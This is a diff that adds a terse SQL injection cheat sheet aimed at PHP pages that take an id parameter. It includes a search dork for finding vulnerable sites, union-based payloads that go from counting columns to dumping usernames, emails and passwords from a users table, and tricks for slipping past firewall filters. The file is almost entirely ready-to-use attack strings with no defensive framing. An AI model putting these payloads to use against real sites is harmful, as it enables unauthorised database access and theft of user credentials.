@@ -1,0 +1,62 @@
+inurl:news.php?id=
+
+http://domain.tld/news.php?id=42
+
+/news.php?id=42'
+
+/news.php?id=42 order by 999--
+
+bypass =>
+
+/news.php?id=42' order by 999--+
+
+/news.php?id=42' order by 7--+
+
+/news.php?id=42' union select 1,2,3,4,5,6,7--+
+
+/news.php?id=42' union select 1,2,3,4,database(),6,7--+
+
+database => 
+
+/news.php?id=42' union select 1,2,3,4,version(),6,7--+
+
+version => 
+
+/news.php?id=42' union select 1,2,3,4,group_concat(table_name,0x3c62723e),6,7 from information_schema.tables where table_schema=database()--+
+
+/news.php?id=42' union select 1,2,3,4,group_concat(column_name,0x3c62723e),6,7 from information_schema.columns where table_name='users'--+
+
+/news.php?id=42' union select 1,2,3,4,group_concat(username,0x3a3a,email,0x3a3a,password,0x3c62723e),6,7 from users--+
+
+------------------------------
+
+order by 999-- => forbidden => group by 999--
+
+order by 999-- => forbidden => order /**V**/ by 999--
+
+order by 999-- => forbidden => order by 999-- -
+
+order by 999-- => forbidden => order by 999-- %23
+
+------------------------------
+
+union select => forbidden => union/**/select
+
+union select 1,2,3,unhex(hex(group_concat(table_name))),5 from ...
+
+union select 1,2,3,uncompress(compress(group_concat(table_name))),5 from..
+
+------------------------------
+
+php?id=-1 => dont show number
+
+bypass
+
+id=1 and 0
+id=1 div 0
+id=1 and 1 like 0
+id=1 where 1 like 0
+id=(1)
+id=9999
+id=null
+
